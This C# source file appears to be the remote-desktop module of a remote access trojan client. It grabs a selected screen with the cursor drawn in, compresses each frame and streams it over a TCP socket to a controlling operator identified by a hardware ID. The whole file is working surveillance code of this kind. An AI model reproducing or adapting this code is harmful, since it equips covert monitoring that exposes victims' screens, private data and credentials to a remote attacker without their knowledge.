using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Client.StreamLibrary;
using Client.StreamLibrary.UnsafeCodecs;
using MessagePack;

namespace Client.HandlePacket
{
    internal class HandleDesktop
    {
        public string Controler_HWID { get; set; }
        public bool IsOk { get; set; }

        public void CaptureAndSend(int quality, int Scrn)
        {
            Native.SetProcessDPIAware();
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            IUnsafeCodec unsafeCodec = new UnsafeOptimizedCodec(quality);
            MemoryStream stream;
            Thread.Sleep(10);
            while (IsOk && Program.TCP_Socket.IsConnected)
                try
                {
                    bmp = GetScreen(Scrn);
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite,
                        bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height),
                            new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { Program.TCP_Socket.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }

                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch (Exception ex)
                {
                    Program.TCP_Socket.Log(Controler_HWID, ex.Message);
                    break;
                }

            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        private static Bitmap GetScreen(int Scrn)
        {
            var rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                var bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (var graphics = Graphics.FromImage(bmpScreenshot))
                {
                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0,
                        new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    Native.CURSORINFO pci;
                    pci.cbSize = Marshal.SizeOf(typeof(Native.CURSORINFO));
                    if (Native.GetCursorInfo(out pci))
                        if (pci.flags == 0x00000001)
                        {
                            Native.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }

                    return bmpScreenshot;
                }
            }
            catch
            {
                return new Bitmap(rect.Width, rect.Height);
            }
        }
    }
}